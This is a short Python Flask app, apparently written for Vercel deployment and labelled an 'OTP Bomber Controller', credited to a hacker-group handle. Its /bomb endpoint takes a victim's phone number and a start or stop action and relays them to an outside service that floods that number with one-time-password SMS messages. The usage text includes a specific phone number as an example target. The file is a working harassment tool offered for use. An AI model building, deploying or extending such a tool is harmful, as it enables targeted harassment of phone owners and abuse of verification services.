from flask import Flask, request, jsonify
import requests

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False

# Credits
DEVELOPER = "CREATOR SHYAMCHAND | @nexxonhackers"

def call_mksocial_api(number, action):
    """
    action: 'start' or 'stop'
    """
    if action == "start":
        url = f"http://smm.mksocial.site/otp.php?numstart={number}"
    else:
        url = f"http://smm.mksocial.site/otp.php?numstop={number}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
    }

    try:
        # MKSocial API-তে রিকোয়েস্ট পাঠানো
        response = requests.get(url, headers=headers, timeout=15)
        return {"status": "success", "raw_response": response.text}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.route("/bomb", methods=["GET"])
def handle_bombing():
    number = request.args.get("num")
    action = request.args.get("action") # start অথবা stop

    if not number or not action:
        return jsonify({
            "error": "Missing parameters",
            "usage": "/bomb?num=8389027924&action=start"
        }), 400

    if action not in ["start", "stop"]:
        return jsonify({"error": "Invalid action. Use 'start' or 'stop'"}), 400

    result = call_mksocial_api(number, action)
    
    return jsonify({
        "status": result["status"],
        "target": number,
        "action": action,
        "api_response": result.get("raw_response") if result["status"] == "success" else result.get("message"),
        "developer": DEVELOPER
    })

@app.route("/")
def home():
    return jsonify({
        "api": "MKSocial OTP Bomber Controller",
        "developer": DEVELOPER,
        "endpoints": {
            "start": "/bomb?num=XXXXXXXXXX&action=start",
            "stop": "/bomb?num=XXXXXXXXXX&action=stop"
        }
    })

# Vercel handler
app_handler = app
                                
